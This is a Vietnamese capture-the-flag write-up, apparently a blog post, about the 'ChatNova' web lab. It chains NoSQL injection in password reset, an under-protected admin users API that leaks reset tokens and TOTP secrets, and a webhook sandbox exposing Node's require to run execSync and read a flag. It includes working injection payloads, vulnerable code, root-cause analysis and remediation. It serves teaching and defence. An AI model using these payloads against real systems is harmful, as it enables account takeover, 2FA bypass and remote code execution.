+++
title = "ChatNova — NoSQL Injection Chain to RCE"
date = 2026-11-17T00:00:00+07:00
draft = false
tags = ["Web", "NoSQL Injection", "MongoDB", "2FA", "RCE", "Node.js"]
categories = ["Writeups"]
summary = "ChatNova: NoSQL Injection ở luồng reset mật khẩu, API lộ dữ liệu admin và webhook JavaScript có thể thực thi lệnh để đọc flag."
ShowToc = true
TocOpen = false
+++

ChatNova là lab CTF Web với chuỗi khai thác NoSQL Injection, lộ dữ liệu quản trị và thực thi JavaScript phía server.

## 1. Tổng quan thử thách

ChatNova là nền tảng trao đổi nội bộ có tài khoản người dùng, kênh chat, quản lý thành viên và webhook integration. Không có đăng ký công khai. Đề cho biết tài khoản `support@chatnova.local` tồn tại; tài khoản admin bật TOTP 2FA, còn script webhook được quảng bá là chạy trong sandbox.

Mục tiêu là kích hoạt webhook handler để thực thi lệnh phía server, đọc `/root/flag.txt` và nhận flag trong HTTP response.

### Attack chain

```text
Landing page / roster
        │
        ▼
Biết email support@chatnova.local
        │
        ▼
Forgot-password → token được lưu trong MongoDB
        │
        ▼
Blind NoSQLi tại password-policy → suy ra reset token
        │
        ▼
Reset mật khẩu → đăng nhập support
        │
        ▼
GET /api/v1/admin/users?query=... qua session support
        │
        ├─ $where/error disclosure
        └─ Hoặc API trả luôn trường services
        │
        ▼
Lấy reset token + TOTP secret admin
        │
        ▼
Reset mật khẩu → sinh mã TOTP → đăng nhập admin
        │
        ▼
Admin → Integrations → Incoming Webhook → Handler Script
        │
        ▼
POST /api/v1/webhooks/<token> → server thực thi handler
        │
        ▼
Đọc /root/flag.txt → response có FLAG{...}
```

## 2. Giai đoạn 1 — Initial Access bằng Blind NoSQL Injection

![Reset password thành công trong Burp](/images/imported/chatnova/image1.png)

### 2.1. Reconnaissance và reset token

Landing page tiết lộ danh sách thành viên và email `support@chatnova.local`. Endpoint quên mật khẩu:

```http
POST /api/v1/auth/forgot-password HTTP/1.1
Content-Type: application/json

{"email":"support@chatnova.local"}
```

Request này yêu cầu backend tạo reset token rồi lưu trong trường `services.password.reset.token`. Response dạng *“If the email exists ...”* không tự nó tiết lộ token.

### 2.2. Lỗ hổng tại `password-policy`

Endpoint kiểm tra password policy sử dụng `token` trực tiếp trong truy vấn:

```javascript
app.post('/api/v1/auth/password-policy', async (req, res) => {
  const { token } = req.body;
  const user = await User.findOne({
    'services.password.reset.token': token
  });
  if (!user) return res.json({ valid: false });
  res.json({ valid: true, policy: { /* ... */ } });
});
```

**Root cause:** server không kiểm tra `typeof token === 'string'` trước khi dùng giá trị làm filter. Khi toán tử được phép đi qua schema và các lớp lọc của Mongoose, object chứa `$regex` hoặc `$ne` trở thành điều kiện truy vấn thay vì chuỗi token cần so sánh.

Request kiểm thử:

```http
POST /api/v1/auth/password-policy HTTP/1.1
Content-Type: application/json

{"token":{"$regex":"^a"}}
```

Với `$regex`, truy vấn kiểm tra có reset token nào bắt đầu bằng `a` hay không. Response `valid:true` / `valid:false` tạo thành **boolean oracle**, cho phép dò token bằng cách tăng dần tiền tố. Với token base64url, tập ký tự gồm `A–Z`, `a–z`, `0–9`, `-`, `_`. Query không ràng buộc email nên có thể khớp token của bất kỳ tài khoản nào đang có yêu cầu reset; cần đối chiếu đúng tài khoản khi sử dụng kết quả.

### Bỏ qua kiểm tra token bằng `$ne`

Một cách kiểm thử khác là gửi object `$ne` trực tiếp tới `/api/v1/auth/reset-password`:

```json
{"token":{"$ne":null},"newPassword":"123456789"}
```

Response trả `HTTP 200` với message `Password has been reset successfully`. Điều kiện `$ne: null` khớp field tồn tại và có giá trị khác null. Nếu handler dùng điều kiện này để chọn user rồi cập nhật mật khẩu, request có thể bỏ qua việc cung cấp token cụ thể. Payload không ràng buộc danh tính nên cần xác định tài khoản bị đổi mật khẩu.

`$regex` dùng oracle để suy ra giá trị token; `$ne` tại endpoint reset có thể bỏ qua phép so sánh token và đổi mật khẩu của một bản ghi khớp điều kiện.

### 2.3. Sử dụng token đã tìm thấy

Gửi token hợp lệ tới endpoint reset mật khẩu:

```http
POST /api/v1/auth/reset-password HTTP/1.1
Content-Type: application/json

{"token":"<support-reset-token>","newPassword":"<new-password>"}
```

Sau khi reset thành công, đăng nhập tài khoản support thông qua `POST /login`; form này sử dụng `application/x-www-form-urlencoded`. Tài khoản support không yêu cầu TOTP.

Session support cho phép tiếp tục truy cập các API chỉ yêu cầu `requireAuth`.

## 3. Giai đoạn 2 — Chiếm quyền admin và vượt 2FA

### 3.1. Tạo reset token admin

Yêu cầu reset mật khẩu cho `admin@chatnova.local` để tạo token trong database. Reset mật khẩu không tự động vượt qua TOTP: bước đăng nhập admin vẫn yêu cầu mã 6 chữ số.

### 3.2. Lỗ hổng `GET /api/v1/admin/users`

![Request và response user query qua Burp Repeater](/images/imported/chatnova/image3.png)

Route quản lý user xử lý query như sau:

```javascript
app.get('/api/v1/admin/users', requireAuth, async (req, res) => {
  const queryParam = req.query.query;
  let filter = {};
  if (queryParam) {
    try { filter = JSON.parse(queryParam); } catch (e) { /* ... */ }
  }
  const users = await User.find(filter, '-password').lean();
  res.json({ users, total: users.length });
});
```

Ở đây xuất hiện **ba root cause bổ trợ nhau**:

1. **Broken Function Level Authorization:** đường dẫn nằm trong namespace `/admin`, nhưng middleware chỉ dùng `requireAuth` (xác thực đã đăng nhập), không chứng minh người gọi có vai trò admin.
2. **NoSQL Injection:** `JSON.parse(req.query.query)` biến chuỗi do client kiểm soát thành object rồi chuyển nguyên vẹn vào `User.find(filter)`, cho phép toán tử truy vấn như `$where`.
3. **Excessive Data Exposure:** `User.find(filter, '-password').lean()` chỉ loại field `password` ở top-level; các field `services.password.reset.token` và `services.totp.secret` vẫn có thể được trả về. `lean()` chuyển kết quả sang JavaScript object thông thường, không phải cơ chế ẩn secret.

### 3.3. `$where` và error-based disclosure

`$where` cho phép MongoDB đánh giá biểu thức JavaScript trên từng document. Cách này yêu cầu server bật JavaScript phía database và filter không chặn toán tử. Nếu biểu thức ném lỗi chứa dữ liệu nhạy cảm và backend trả nội dung exception ra HTTP response, dữ liệu có thể bị lộ qua **error-based NoSQL injection**.

Về bản chất, đây là chuỗi:

```text
query do client kiểm soát
   → JSON.parse()
   → User.find(filter)
   → MongoDB đánh giá $where
   → exception chứa giá trị nội bộ
   → response phản chiếu exception
```

Ngay cả khi không dùng `$where`, filter `{"username":"admin"}` vẫn trả `HTTP 200` với dữ liệu admin, gồm `role` và `services.password.reset.token`. Lỗi trả thừa dữ liệu làm lộ token trực tiếp; việc route chỉ dùng `requireAuth` còn cho phép tài khoản thường truy cập chức năng quản trị.

### 3.4. Vì sao 2FA không còn bảo vệ được admin?

![Giao diện admin bị chặn bởi 2FA](/images/imported/chatnova/image4.png)

TOTP dựa vào một khóa bí mật chung và thời gian hiện tại (thường chu kỳ 30 giây). Khi database API tiết lộ `services.totp.secret`, attacker có đủ đầu vào để tính được cùng loại mã mà ứng dụng xác minh. Vì thế, dù màn hình đăng nhập báo **“Two-factor authentication code required”**, lớp 2FA đã mất ý nghĩa khi secret server-side bị lộ.

Khi có reset token và TOTP secret của admin, có thể đặt mật khẩu mới rồi tạo mã TOTP để đăng nhập.

Sau khi đăng nhập, giao diện hiển thị tài khoản `Marcus Chen`, menu **Admin → User Management / Integrations** và kênh riêng `#devops`.

![Đăng nhập thành công dưới tài khoản admin](/images/imported/chatnova/image5.png)

## 4. Giai đoạn 3 — RCE thông qua Incoming Webhook và lấy flag

### 4.1. Tính năng đích

Từ menu **Admin → Integrations**, người dùng admin tạo một **Incoming Webhook** với trường **Handler Script (server-side JavaScript)**. Integration tên `aaaa` ở trạng thái `Active`, có đường dẫn dạng:

```text
/api/v1/webhooks/<webhook-token>
```

Màn hình có các trường `Integration Name`, `Type`, `Description`, `Target Channel`, `External Webhook URL`, `Handler Script`. Đối với webhook incoming, External Webhook URL có thể để trống với cấu hình incoming này.

### 4.2. Root cause: sandbox không phải security boundary

Mã nguồn được cung cấp:

```javascript
const sandbox = {
  payload: req.body,
  require: require, // Node.js module loader bị đưa vào sandbox
};
const context = vm.createContext(sandbox);
const script = new vm.Script(`(function() { ${integration.script} })()`);
const result = script.runInContext(context);
```

**Root cause chính nằm ở `require: require`.** Ứng dụng lấy `require` từ tiến trình Node.js chính rồi cấp vào context của script do người dùng admin kiểm soát. Khi script có quyền dùng module loader này, giới hạn của context không còn ngăn được việc gọi các module Node.js có quyền tương đương tiến trình server.

Đoạn code sử dụng `vm.createContext` và `vm.Script` của `node:vm`. Việc cấp host `require` cho script cho phép truy cập các module có quyền của tiến trình server. Đây là lỗi cấu hình môi trường thực thi; không cần khai thác một CVE của `vm2`. [Tài liệu Node.js](https://nodejs.org/api/vm.html) nêu rõ `node:vm` không phải cơ chế bảo mật để chạy code không tin cậy.

### 4.3. Webhook handler

Handler dùng `child_process` để chạy lệnh đọc file flag:

```javascript
return require('child_process')
  .execSync('cat /root/flag.txt')
  .toString();
```

Giải thích cơ chế:

- `require('child_process')`: lấy module thao tác với process của Node.js.
- `execSync(...)`: yêu cầu hệ điều hành thực hiện lệnh đồng bộ theo quyền của tiến trình backend.
- `cat /root/flag.txt`: đọc file chứa flag.
- `.toString()`: chuyển dữ liệu trả về thành chuỗi JavaScript.
- `return`: đưa kết quả về handler để backend trả trong HTTP response.

Handler chạy với quyền của tiến trình backend. Để đọc được flag, tiến trình này phải có quyền truy cập `/root/flag.txt` và API phải trả kết quả thực thi về cho người gọi.

### 4.4. Kích hoạt webhook và response mục tiêu

Sau khi tạo integration, gọi incoming webhook bằng POST với JSON body:

```http
POST /api/v1/webhooks/<webhook-token> HTTP/1.1
Content-Type: application/json

{}
```

**Response thành công, rút gọn nội dung flag:**

```json
{"success":true,"result":"FLAG{...}"}
```

Giá trị flag trong ví dụ được thay bằng `FLAG{...}`. Ký tự `\n` trong response là xuống dòng cuối file.

### 4.5. Kết quả thực thi

Integration `aaaa` ở trạng thái `Active`, có handler đọc file flag. Bộ đếm `0 times` là trạng thái trước khi gửi request tới webhook.

![Incoming webhook đã được tạo, ở trạng thái Active](/images/imported/chatnova/image2.png)

Burp Repeater nhận `HTTP 200`, `success: true` và trường `result` chứa flag sau khi gọi webhook:

![Burp Repeater trả HTTP 200 và kết quả FLAG trong JSON response](/images/imported/chatnova/image6.png)

## 5. Root Cause Summary

| Lớp | Root cause | Điều kiện bị phá vỡ | Hậu quả trong attack chain |
|---|---|---|---|
| Password reset | `token` được dùng làm filter mà thiếu kiểm tra kiểu | Phải chứng minh biết token cụ thể trước khi đổi mật khẩu | Có thể tạo blind oracle hoặc bỏ qua phép so sánh token, tùy endpoint |
| User management | Chỉ yêu cầu đăng nhập, không kiểm tra role admin | Tài khoản thường không được gọi API quản trị | Session support có thể truy vấn dữ liệu admin |
| MongoDB filtering | `query` do client kiểm soát đi trực tiếp vào `find()` | Người dùng không được cung cấp toán tử truy vấn tùy ý | `$where` có thể dẫn đến thực thi biểu thức trong query và lỗi tiết lộ dữ liệu |
| Data minimization | Projection `'-password'` không loại `services` | API liệt kê user không được trả credentials/secret | TOTP secret và reset token lộ trực tiếp |
| Webhook scripting | Cấp host `require` vào `node:vm` context | Script không tin cậy không được chạm tới Node.js/process/FS | Có khả năng thực thi lệnh với quyền server và đọc flag |

Chuỗi khai thác đi từ xử lý token không an toàn tới dữ liệu quản trị, rồi từ quyền admin tới chức năng chạy JavaScript phía server. Các lỗi kết hợp cho phép thực thi lệnh và đọc flag.

## 6. Remediation — Hướng sửa lỗi

### 6.1. Chặn NoSQL injection trong token validation

```javascript
const { token } = req.body;
if (typeof token !== 'string' || !/^[A-Za-z0-9_-]{43}$/.test(token)) {
  return res.status(400).json({ error: 'Invalid token format' });
}
const user = await User.findOne({ 'services.password.reset.token': token });
```

Regex độ dài 43 ở trên chỉ phù hợp nếu code sinh token thực tế bảo đảm định dạng đó; cần điều chỉnh theo ứng dụng. Áp dụng kiểm tra kiểu cho cả endpoint policy lẫn reset; kiểm tra hạn dùng và ràng buộc đúng tài khoản, tiêu thụ token một lần bằng thao tác cập nhật nguyên tử. Nên lưu hash token thay vì token nguyên văn, bổ sung rate limit và tránh để API policy làm oracle kiểm tra token.

### 6.2. Khóa quyền admin + không trả secret

```javascript
app.get('/api/v1/admin/users', requireAuth, requireAdmin, async (req, res) => {
  const { username } = req.query;
  const users = await User.find(
    typeof username === 'string' ? { username } : {},
    'username email displayName role avatar title department status'
  ).lean();
  res.json({ users, total: users.length });
});
```

Không nhận tùy ý JSON MongoDB query từ client. Nên dùng filter schema/allowlist cho từng field, chặn `$where` và các toán tử không cần thiết, định nghĩa projection **allowlist** thay vì cố loại bỏ từng trường bí mật.

### 6.3. Cô lập webhook thực sự

Không expose `require`, `process`, filesystem, shell, network và các capability nguy hiểm vào script context. Đối với script không tin cậy, chỉ `node:vm` là không đủ để coi như ranh giới bảo mật; cần sandbox/process/container được cô lập phù hợp, giới hạn quyền hệ điều hành, thời gian chạy, CPU/memory và filesystem. Tốt hơn là chỉ hỗ trợ các handler template an toàn thay vì JavaScript tùy ý.

### 6.4. Phục hồi sau khai thác

Vô hiệu hóa/reset các token bị lộ, xoay vòng TOTP secret, reset các session bị ảnh hưởng, rà soát webhook integration đã tạo và kiểm tra audit log các request đến endpoint liên quan.

## 7. Kết quả

Request tới incoming webhook trả `HTTP 200`, `success: true` và nội dung flag trong trường `result`. Chuỗi NoSQL Injection, lộ dữ liệu quản trị và webhook scripting cho phép đi từ tài khoản thường tới thực thi lệnh phía server.

## Tài liệu tham khảo

- [MongoDB: điều kiện không bằng null](https://www.mongodb.com/docs/manual/tutorial/query-for-null-fields/#non-equality-filter).
- [MongoDB: `$where`](https://www.mongodb.com/docs/manual/reference/operator/query/where/).
- [Mongoose: query casting](https://mongoosejs.com/docs/tutorials/query_casting.html).
- [Node.js: `vm`](https://nodejs.org/api/vm.html).
